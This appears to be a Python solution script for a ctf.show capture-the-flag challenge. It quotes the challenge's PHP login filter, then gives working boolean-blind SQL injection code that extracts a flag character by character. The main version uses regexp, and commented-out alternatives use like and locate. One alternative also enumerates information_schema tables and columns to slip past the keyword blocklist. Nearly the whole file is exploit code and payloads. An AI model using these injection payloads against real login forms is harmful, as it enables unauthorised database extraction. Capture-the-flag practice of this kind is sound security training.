'''  //密码检测
  if(!is_numeric($password)){
    $ret['msg']='密码只能为数字';
    die(json_encode($ret));
  }

  //密码判断
  if($row['pass']==$password){
      $ret['msg']='登陆成功';
    }

    if(preg_match('/file|into|ascii|ord|hex|substr|char|left|right|substring/i', $username)){
        $ret['msg']='用户名非法';
        die(json_encode($ret));
    }
'''

# 应该还可以用instr等函数，LOCATE、POSITION、INSTR、FIND_IN_SET、IN、LIKE
#  regexp方法
import requests
import string

url = "http://5f56c6cd-c2f2-4621-a05f-427ea772d476.chall.ctf.show:8080/api/index.php"
flagstr = " _{}-" + string.ascii_lowercase + string.digits
flag = ''
for i in range(1, 45):
    for j in flagstr:
        payload = f"' or (select group_concat(f1ag) from ctfshow_flxg) regexp ('^{flag + j}')-- -"
        print(f'次数i={i}, 字符j={j}')
        print(payload)
        data = {
            'username': payload,
            'password': '1'
        }
        r = requests.post(url, data=data)
        if "密码错误" == r.json()['msg']:
            flag += j
            print(flag)
            if j == "}":
                exit(0)
            break


# like方法
# @Author:feng
# import requests
#
# url = 'http://5f56c6cd-c2f2-4621-a05f-427ea772d476.chall.ctf.show:8080/api/index.php'
# flag = ""
# for i in range(0, 100):
#     for j in "0123456789abcdefghijklmnopqrstuvwxyz-,{}_":
#         # payload="' or if((select group_concat(table_name) from information_schema.tables where table_schema=database()) like '{}',1,0)-- -".format(flag+j+"%")
#         # payload="' or if((select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flxg') like '{}',1,0)-- -".format(flag+j+"%")
#         payload = "' or if((select group_concat(f1ag) from ctfshow_flxg) like '{}',1,0)-- -".format(flag + j + "%")
#         print(f'次数i={i}, 字符j={j}')
#
#         data = {
#             'username': payload,
#             'password': 1
#         }
#         # print(payload)
#         r = requests.post(url=url, data=data)
#         # print(payload)
#         if r"\u5bc6\u7801\u9519\u8bef" in r.text:
#             flag += j
#             print(flag)
#             if j == '}':
#                 exit()
#             break

# locate方法
# @Author:feng
# import requests
#
# url = 'http://5f56c6cd-c2f2-4621-a05f-427ea772d476.chall.ctf.show:8080/api/index.php'
# flag = ""
# for i in range(0, 100):
#     for j in "0123456789abcdefghijklmnopqrstuvwxyz-,{}_":
#
#         # payload="' or if(locate('{}',(select group_concat(f1ag) from ctfshow_flxg))=1,1,0)-- -".format(flag+j)
#         payload = "' or locate('{}',(select group_concat(f1ag) from ctfshow_flxg))=1-- -".format(flag + j)
#         print(f'次数i={i}, 字符j={j}')
#         data = {
#             'username': payload,
#             'password': 1
#         }
#         r = requests.post(url=url, data=data)
#         if r"\u5bc6\u7801\u9519\u8bef" in r.text:
#             flag += j
#             print(flag)
#             if j == '}':
#                 exit()
#             break

# ctfshow{955bd022-b77e-4cf3-a6e5-1ee32a09d854}